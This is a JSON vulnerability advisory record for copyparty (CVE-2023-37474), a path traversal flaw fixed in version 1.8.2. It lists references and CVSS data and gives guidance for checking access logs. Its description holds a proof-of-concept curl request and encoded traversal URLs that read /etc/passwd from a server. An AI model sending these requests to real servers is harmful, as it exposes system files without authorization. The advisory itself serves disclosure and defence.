{
  "Severity": "HIGH",
  "UpdatedAt": "2023-07-14T21:59:23Z",
  "Package": {
    "Ecosystem": "PIP",
    "Name": "copyparty"
  },
  "Advisory": {
    "DatabaseId": 215934,
    "Id": "GSA_kwCzR0hTQS1weGZ2LTdycjMtMnFqZ84AA0t-",
    "GhsaId": "GHSA-pxfv-7rr3-2qjg",
    "References": [
      {
        "Url": "https://github.com/9001/copyparty/security/advisories/GHSA-pxfv-7rr3-2qjg"
      },
      {
        "Url": "https://nvd.nist.gov/vuln/detail/CVE-2023-37474"
      },
      {
        "Url": "https://github.com/9001/copyparty/commit/043e3c7dd683113e2b1c15cacb9c8e68f76513ff"
      },
      {
        "Url": "https://github.com/9001/copyparty/releases/tag/v1.8.2"
      },
      {
        "Url": "https://github.com/advisories/GHSA-pxfv-7rr3-2qjg"
      }
    ],
    "Identifiers": [
      {
        "Type": "GHSA",
        "Value": "GHSA-pxfv-7rr3-2qjg"
      },
      {
        "Type": "CVE",
        "Value": "CVE-2023-37474"
      }
    ],
    "Description": "### Summary\nPath traversal vulnerability detected in .cpr subfolder.\nThe Path Traversal attack technique allows an attacker access to files, directories, and commands that  reside outside the web document root directory.\n\nTested in Debian Linux.\n\n### Details\n\nSteps to reproduce:\n\n1)Install the software  python3 -m pip install --user -U copyparty\n2)Execute using the default config : copyparty\n3) Execute the POC curl command \n4) /etc/passwd file of the remote server is accessible. \n\n### PoC\n\n```bash\ncurl -i -s -k -X  GET 'http://172.19.1.2:3923/.cpr/%2Fetc%2Fpasswd'\n```\n\nAdditional examples:\n\nhttp://172.19.4.2:3923/.cpr/a/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\n\nhttp://172.19.4.2:3923/.cpr/deps/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd\n\n### Checking for exposure\n\nif copyparty is running behind a reverse proxy, you can check the access-logs for traces of attacks, by grepping your access-logs for URLs containing both `.cpr/` and `%`\n* nginx:\n  ```bash\n  sed -r 's/\" [0-9]+ .*//' nginx.access.log | grep -E 'cpr/.*%2F' | grep -vF data:image/svg\n  ```\n",
    "Origin": "UNSPECIFIED",
    "PublishedAt": "2023-07-14T21:59:23Z",
    "Severity": "HIGH",
    "Summary": "copyparty vulnerable to path traversal attack affecting all subfolders in http://localhost:3923/.cpr/ subfolder",
    "UpdatedAt": "2023-07-14T21:59:23Z",
    "WithdrawnAt": "",
    "CVSS": {
      "Score": 7.5,
      "VectorString": "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N"
    }
  },
  "Versions": [
    {
      "FirstPatchedVersion": {
        "Identifier": "1.8.2"
      },
      "VulnerableVersionRange": "\u003c 1.8.2"
    }
  ]
}